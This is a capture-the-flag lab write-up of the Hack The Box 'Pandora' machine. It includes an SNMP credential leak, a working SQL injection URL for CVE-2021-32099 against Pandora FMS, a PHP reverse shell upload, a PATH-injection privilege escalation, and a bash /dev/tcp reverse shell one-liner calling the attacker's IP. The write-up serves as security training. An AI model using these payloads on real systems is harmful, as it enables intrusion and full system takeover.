## Default Information
IP Address: 10.10.11.136\
OS: Linux

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.11.136    pandora.htb
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 22  | TCP/SSH  | OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | Open |
| 80  | TCP/HTTP | Apache httpd 2.4.41 ((Ubuntu)) | Open |
| 161 | UDP/SNMP | SNMPv1 server; net-snmp SNMPv3 server (public) | Open |

### Gobuster
We will then use Gobuster to find the endpoints that are accessible from http://pandora.htb. However, there is only 1 endpoint that is accessible.

```
http://10.10.11.136:80/index.html           (Status: 200) [Size: 33560]
```
We will also tried to find virtual hosts on http://sense.htb, but we were unable to find any vhosts.

### Web-content discovery
Visiting http://www.pandora.htb, we are unable to find any potential points of exploitation. However, we are able to find a ```panda.htb``` text on the page. 
![panda.htb](https://github.com/joelczk/writeups/blob/main/HTB/Images/Pandora/panda_htb.png)

We will then proceed to add panda.htb to our /etc/hosts file.

```
10.10.11.136    pandora.htb panda.htb
```

However, visiting http://panda.htb only redirects us to the same site so, we are unable to find anything meaningful from there.

## Exploit
### SNMP enumeration
From the earlier nmap output, UDP port 161 is an SNMPv1 server. So, we will use snmpwalk to enumerate all the information from the snmp server. We will then redirect the output to a file named ```snmp.txt```

```
┌──(kali㉿kali)-[~/Desktop]
└─$ snmpwalk -v1 -c public 10.10.11.136 .1 > snmp.txt
```
From the output file, we are able to obtain a set of credentials

```
┌──(kali㉿kali)-[~/Desktop]
└─$ cat snmp.txt | grep "daniel"
iso.3.6.1.2.1.25.4.2.1.5.795 = STRING: "-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'"
iso.3.6.1.2.1.25.4.2.1.5.1116 = STRING: "-u daniel -p HotelBabylon23"
```

### SSH to Daniel
Using the credentials that we have obtained from the snmp enumeration, we can SSH into the server.

```
┌──(kali㉿kali)-[~]
└─$ ssh daniel@10.10.11.136                       
daniel@pandora:~$ pwd
/home/daniel
daniel@pandora:~$ 
```

However, we realize that the user flag is in matt's directory and we do not have the privilege to access the directory.

```
daniel@pandora:/home$ cat matt/user.txt
cat: matt/user.txt: Permission denied
```

### Privilege Escalation to Matt

Using the linpeas script, we realize that ports 53 and 3306 are open on the localhost. Hence, we would need to do port forwarding to make the service on ports 53/3306 available on our local machine. 

```
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports                                             
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                                    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      - 
```

Firstly, let us try to use ssh to forward port 3306 to our local machine. However, this port seems to be used for MariaDB.

![maria db](https://github.com/joelczk/writeups/blob/main/HTB/Images/Pandora/maria_db.png)

Next, let us try to use ssh to forward the port 53 to our local machine. However, for this port we were unable to access the service. 

Looking at the 2 ports, I suspect that there may be a web service that is running on the localhost. To prove that, we shall use the curl command to check if we can reach pandora.htb. Since we are able to reach pandora.htb, there is a port 80 that is active on the localhost.

```
daniel@pandora:~$ curl pandora.htb
<meta HTTP-EQUIV="REFRESH" content="0; url=/pandora_console/">
```

Knowing that, let us use ssh to forward the traffic on port 80 to our local machine. Thankfully, it worked this time and it redirects us to a Pandora FMS page.
![Pandora FMS page](https://github.com/joelczk/writeups/blob/main/HTB/Images/Pandora/pandora_fms.png)

Looking at the source code, we can also find the version information of Pandora FMS.

```
<div id="ver_num">v7.0NG.742_FIX_PERL2020</div>
```

### SQL Injection on Pandora FMS
Researching on possible exploits for Pandora FMS, we realize that most exploits on Pandora FMS version 7 require the users to be authenticated which is a dead-end for us. However, we were able to find a CVE-2021-32099 from [here](https://github.com/zjicmDarkWing/CVE-2021-32099).

Next, let us attempt to exploit the SQL Injection vulnerability on Pandora FMS to gain authenticated access into ```pandora_console```. To do that, let us first visit ```http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=%27%20union%20SELECT%201,2,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20--%20SgGO'```. Afterward, all we have to do, is to visit http://127.0.0.1/pandora_console and we can gain access into the console. 

### Reverse shell on authenticated Pandora FMS
Next, all we have to do is to upload the reverse shell payload onto file upload manager. 
![File upload](https://github.com/joelczk/writeups/blob/main/HTB/Images/Pandora/file_upload.png)

Afterwards, we can spawn the reverse shell by visiting http://127.0.0.1/pandora_console/images/reverse.php.

```
┌──(HTB)─(kali㉿kali)-[~/Desktop/pandora]
└─$ nc -nlvp 4000
listening on [any] 4000 ...
connect to [10.10.16.8] from (UNKNOWN) [10.10.11.136] 56582
Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 05:04:21 up 32 min,  1 user,  load average: 0.03, 0.18, 0.09
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
daniel   pts/0    10.10.16.8       04:33   31:04   0.02s  0.02s -bash
uid=1000(matt) gid=1000(matt) groups=1000(matt)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
matt@pandora:/$ export TERM=xterm
export TERM=xterm
matt@pandora:/$ stty cols 132 rows 34
stty cols 132 rows 34
```

### Obtaining user flag
```
matt@pandora:/home/matt$ cat /home/matt/user.txt
cat /home/matt/user.txt
<Redacted user flag>
```

### Upgrading shell to ssh shell
Before we start to exploit the path injection, we realize that the shell that we are currently in is not stable shell. Hence, we would need to upgrade our shell to a more stable shell. However, since we do not have the credentials of the matt user, we would need to generate our own ssh key to ssh into the matt user.

```
matt@pandora:/tmp$ sudo /usr/bin/pandora_backup
sudo: PERM_ROOT: setresuid(0, -1, -1): Operation not permitted
sudo: unable to initialize policy plugin
```

First, we will use ```ssh-keygen``` to generate a SSH keypair in our local machine 

```
┌──(kali㉿kali)-[~/Desktop/pandora]
└─$ ssh-keygen                                                                                                   5 ⚙
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): /home/kali/Desktop/pandora/id_rsa
/home/kali/Desktop/pandora/id_rsa already exists.
Overwrite (y/n)? y
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kali/Desktop/pandora/id_rsa
Your public key has been saved in /home/kali/Desktop/pandora/id_rsa.pub
The key fingerprint is:
SHA256:HYaUxqwNCmJCbGYquUY4OivigEqnMB3HKsgUZWwF1BI kali@kali
The key's randomart image is:
+---[RSA 3072]----+
|o.oE=. o..       |
|o*++ ...=.       |
|O+.... =. o      |
|*.... . .o .     |
|++. o   S .      |
|Oo +             |
|O=o.             |
|Ooo              |
|=o               |
+----[SHA256]-----+
```

Next, we will have to transfer the public keys to the target server and rename the public keys to authorized_keys. Afterwards, we will have to modify the permissions of authorized_keys

```
matt@pandora:/home/matt/.ssh$ wget http://10.10.16.8:3000/id_rsa.pub 
wget http://10.10.16.8:3000/id_rsa.pub
matt@pandora:/home/matt/.ssh$ mv id_rsa.pub authorized_keys
mv id_rsa.pub authorized_keys
matt@pandora:/home/matt/.ssh$ chmod 700 authorized_keys
chmod 700 authorized_keys
matt@pandora:/home/matt/.ssh$ 
```

### Exploiting pandora_backup

Using Linpeas, we realize that there is a setuid bit for /usr/bin/pandora_backup which could be exploited

```
════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════
╔══════════╣ SUID - Check easy privesc, exploits and write perms                                                     
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                          
strings Not Found                                                                                                    
-rwsr-xr-x 1 root root 163K Jan 19  2021 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable                
-rwsr-xr-x 1 root root 31K May 26  2021 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)                                                                                                                  
-rwsr-xr-x 1 root root 84K Jul 14  2021 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 44K Jul 14  2021 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 87K Jul 14  2021 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 39K Jul 21  2020 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-x--- 1 root matt 17K Dec  3 15:58 /usr/bin/pandora_backup (Unknown SUID binary)
```

Reversing the /usr/bin/pandora_backup using IDA, we realize that this executable is vulnerable to path injection attack as the full path of tar was not specified in the code. 

```
if ( system("tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*") )
```

### Exploiting path injection for privilege escalation to root
First, we would have to create a tar executable that will execute the "/bin/bash" command. Afterwards, we will modify the permissions of the tar executable to give it execute permissions. 

```
matt@pandora:/tmp$ echo "/bin/bash" > tar
matt@pandora:/tmp$ chmod +x tar
```

Next, we will have to modify the $PATH variables to add the current directory into our $PATH variable. 

```
matt@pandora:/tmp$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
matt@pandora:/tmp$ export PATH=$(pwd):$PATH
matt@pandora:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
matt@pandora:/tmp$ 
```

Lastly, all we have to do is to exeute /usr/bin/pandora_backup

```
matt@pandora:/tmp$ /usr/bin/pandora_backup
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
root@pandora:/tmp# 
```
### Obtaining root flag

```
root@pandora:/tmp# cat /root/root.txt
<Redacted root flag>
```

## Post-Exploitation
### Privilege Escalation to root using reverse shell payload
An alternative way of obtaining privilege escalation to root is to use the reverse shell payload. Similiarly, we will have to add the current directory to our $PATH variable (Not shown below).

```
matt@pandora:/tmp$ echo "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.16.8/3000 0>&1'" > tar
matt@pandora:/tmp$ chmod +x tar
matt@pandora:/tmp$ /usr/bin/pandora_backup
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
```

This will then spawn a reverse shell with root privileges.

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 3000
listening on [any] 3000 ...
connect to [10.10.16.8] from (UNKNOWN) [10.10.11.136] 40566
root@pandora:/tmp# whoami
whoami
root
root@pandora:/tmp# 
```
